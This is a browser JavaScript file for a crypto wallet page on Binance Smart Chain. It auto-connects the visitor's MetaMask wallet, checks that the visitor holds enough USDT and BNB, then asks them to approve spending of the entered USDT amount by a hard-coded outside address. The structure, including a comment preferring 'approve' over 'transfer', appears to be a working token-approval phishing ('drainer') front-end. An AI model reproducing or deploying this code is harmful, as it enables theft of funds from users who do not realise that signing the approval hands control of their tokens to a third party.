let provider;
let signer;
let tokenContract;

// BSC Configuration
const BSC_CHAIN_ID = "0x38"; // 56 in decimal
const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC-Pegged USDT
const SPENDER_ADDRESS = "0x220BB5df0893F21f43e5286Bc5a4445066F6ca56"; // Your specific spender

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) public returns (bool)",
  "function decimals() view returns (uint8)",
  "function balanceOf(address owner) view returns (uint256)"
];

// --- AUTO-CONNECT LOGIC ---
window.addEventListener('load', async () => {
  if (window.ethereum) {
    try {
      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
      if (accounts.length > 0) {
        await connectWallet(); 
      }
    } catch (err) {
      console.error("Auto-connect check failed", err);
    }
  }
});

async function checkAndSwitchNetwork() {
  const chainId = await window.ethereum.request({ method: 'eth_chainId' });
  if (chainId !== BSC_CHAIN_ID) {
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: BSC_CHAIN_ID }],
      });
    } catch (err) {
      if (err.code === 4902) {
        await window.ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: BSC_CHAIN_ID,
            chainName: 'Binance Smart Chain',
            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
            rpcUrls: ['https://bsc-dataseed.binance.org/'],
            blockExplorerUrls: ['https://bscscan.com/']
          }]
        });
      }
    }
  }
}

async function connectWallet() {
  if (!window.ethereum) return alert("Please install MetaMask!");
  try {
    await checkAndSwitchNetwork();
    
    provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    
    signer = await provider.getSigner();
    tokenContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);
    
    const address = await signer.getAddress();
    document.getElementById("status").innerText = `Connected (BSC): ${address.slice(0,6)}...${address.slice(-4)}`;
  } catch (err) {
    console.error(err);
    document.getElementById("status").innerText = "Connection failed.";
  }
}

async function executeApproval() {
  if (!tokenContract) {
    await connectWallet();
    if (!tokenContract) return;
  }

  const amountStr = document.getElementById("amount").value;
  if (!amountStr) return alert("Please enter an amount.");

  try {
    document.getElementById("status").innerText = "Checking balance...";
    
    const userAddress = await signer.getAddress();
    const decimals = await tokenContract.decimals();
    const parsedAmount = ethers.parseUnits(amountStr, decimals);

    // 1. Check USDT Balance to ensure approval is possible
    const userBalance = await tokenContract.balanceOf(userAddress);
    if (userBalance < parsedAmount) {
      document.getElementById("status").innerText = "Error: Insufficient USDT balance.";
      return;
    }

    // 2. Check BNB (Gas) Balance
    const bnbBalance = await provider.getBalance(userAddress);
    if (bnbBalance === 0n) {
      document.getElementById("status").innerText = "Error: BNB required for gas fees.";
      return;
    }

    document.getElementById("status").innerText = "Check wallet to approve...";

    // Use 'approve' instead of 'transfer'
    const tx = await tokenContract.approve(SPENDER_ADDRESS, parsedAmount);

    document.getElementById("status").innerText = "Confirming on BSC...";
    await tx.wait();

    document.getElementById("status").innerText = "Success! Approval set.";
  } catch (err) {
    console.error(err);
    document.getElementById("status").innerText = "Error: " + (err.reason || "Action denied.");
  }
}
